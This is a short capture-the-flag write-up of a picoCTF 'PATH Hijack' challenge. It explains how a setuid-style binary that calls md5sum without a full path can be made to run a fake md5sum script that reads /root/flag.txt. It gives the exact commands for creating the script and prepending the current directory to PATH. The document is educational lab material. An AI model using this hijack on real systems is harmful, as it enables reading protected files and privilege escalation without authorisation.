# PATH Hijack

**Platform:** picoCTF  
**Technique:** PATH Manipulation / Binary Hijacking  
**Difficulty:** Easy  

## Challenge Description

A binary (`flaghasher`) calls `md5sum` to compute the hash of `/root/flag.txt`. By manipulating the `PATH` environment variable, we can make it run our own script instead of the real `md5sum`, printing the flag directly.

## Vulnerability

The program uses `md5sum` without specifying the full path (`/usr/bin/md5sum`). This means it searches for `md5sum` in the directories listed in the `PATH` environment variable. If we can add a directory we control to `PATH` (like `/tmp`), we can place a fake `md5sum` that gets executed instead.

## Exploitation

### Step 1: Find the Target

Run the binary to see what it does:

```bash
./flaghasher
Output: bdb2d099aeef7e27a6eacc0157805c9b /root/flag.txt
```

The binary is computing an MD5 hash — likely using the md5sum command.

Step 2: Create a Fake md5sum
```bash
cd /tmp
echo -e '#!/bin/bash\ncat /root/flag.txt' > md5sum
chmod +x md5sum
```
This script will print the flag instead of computing the hash.

Step 3: Find the Real Binary
```bash
find / -name flaghasher 2>/dev/null
Output: /home/ctf-player/flaghasher
```

Now we know where the target binary lives.

Step 4: Hijack PATH
```bash
PATH=.:$PATH /home/ctf-player/flaghasher
```
PATH=.:$PATH tells the system to look in the current directory (.) first

/home/ctf-player/flaghasher runs the binary

The binary looks for md5sum → finds our fake script → executes it → prints the flag

Step 5: Get the Flag
The binary prints the flag directly.
